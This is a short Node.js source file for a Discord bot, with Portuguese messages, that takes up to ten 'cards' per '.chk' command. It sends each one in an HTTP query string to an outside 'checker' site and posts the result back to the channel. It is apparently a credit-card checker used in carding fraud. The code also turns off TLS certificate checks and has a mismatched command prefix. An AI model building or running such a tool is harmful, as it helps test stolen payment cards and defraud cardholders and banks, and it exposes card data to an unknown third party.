const Discord = require('discord.js');
const bot = new Discord.Client();

bot.on('message', (msg) => {
	
    const message = msg.content.toLowerCase();
    if(message.startsWith('.chk')) {
      if(msg.channel.id !== '451146432678723595') {
        msg.channel.send({embed: {
            color: 1752220,
            description: "Utilizar este comando em <#451146432678723595>"
          }});
        return;
    }
        Check(msg);
    }
	
});

function Check(message) {
var cc = message.content.replace("!chk ", "").split("\n");
if(cc.length > 10){
return message.reply("** O LIMITE DE CARTÕES É __10__**");
}
        cc.forEach(function (value) {
      	Request("http://thelimaochecker.tk/bot/chk.php?dados=" + value + "&comander=" + message.author.username, function(result) {
		message.channel.send(result);
      });
        });

  }
	
	 
	  
  function Request(request2, callback) {
    process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
    var request = require("request");
    request({
      url: request2
    }, function (error, response, body) {
       if (!error && response.statusCode == 200) {
          callback(body);
       } 
    });
  }



bot.login(process.env.BOT_TOKEN);
